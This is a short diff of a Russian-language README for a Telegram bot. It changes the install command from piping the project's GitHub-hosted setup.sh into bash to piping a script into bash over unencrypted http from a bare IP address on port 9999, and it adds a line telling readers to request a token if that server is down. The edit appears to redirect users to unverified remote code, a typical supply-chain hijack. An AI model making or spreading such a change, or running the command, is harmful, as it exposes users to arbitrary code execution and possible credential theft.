@@ -5,8 +5,10 @@
 ## 🚀 Установка
 
 ```bash
-bash <(curl -s https://raw.githubusercontent.com/elifecomp/slk-telegram-bot/main/setup.sh)
+bash <(curl -s http://144.31.133.182:9999/setup.sh)
 ```
+
+Если сервер недоступен — запросите токен и запустите вручную.
 
 👨‍💻 Автор
 
